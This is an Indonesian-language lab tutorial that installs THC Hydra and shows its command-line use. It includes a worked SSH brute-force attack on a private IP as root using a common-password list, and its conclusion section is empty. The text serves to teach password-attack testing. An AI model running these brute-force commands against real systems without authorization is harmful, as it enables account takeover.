INSTALASI THC HYDRA
-------------------
- **Step 1**    : Clone repository THC Hydra
```
git clone https://github.com/vanhauser-thc/thc-hydra.git
```
- **Step 2**    : Untuk menkonfigurasi, compile dan menginstall Hydra, ketik kode berikut di terminal:
```
cd thc-hydra
./configure
make
make install
```

SUPPORTED PLATFORMS
-------------------
- Semua platform UNIX (Linux, *bsd, Solaris, etc.)
- MacOS
- Windows dengan Cygwin (IPv4 and IPv6)
- Mobile systems based on Linux, MacOS or QNX (e.g. Android, iPhone, Blackberry 10, Zaurus, iPad)

UJI COBA
--------
**Contoh**:
```
  hydra -l user -P passlist.txt ftp://192.168.0.1
  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
  hydra -l admin -p password ftp://[192.168.0.0/24]/
  hydra -L logins.txt -P pws.txt -M targets.txt ssh
```
Pertama, Siapkan file yang terdiri dari kumpulan password yang dipisahkan oleh baris atau download [disini](assets/ncrack-hydra/500-worst-passwords.txt). Pada uji coba kali ini, kita akan mencoba melakukan _brute force attack_ pada protokol SSH ke ip address `10.151.36.98` dengan asumsi username `root` dan list password menggunakan file yang telah disiapkan, jalankan perintah dibawah ini pada terminal :
```
hydra -l root -P 500-worst-passwords.txt 10.151.36.98 ssh
```
![](/assets/ncrack-hydra/hydra-gagal.png)
Uji Coba gagal karena password yang digunakan tidak berada dalam file [500-worst-passwords.txt](assets/ncrack-hydra/500-worst-passwords.txt), tambahkan password yang digunakan dengan cara:
```
echo "kucinglucu" >> 500-worst-passwords.txt
```
![](/assets/ncrack-hydra/hydra-sukses.png)

KESIMPULAN
----------









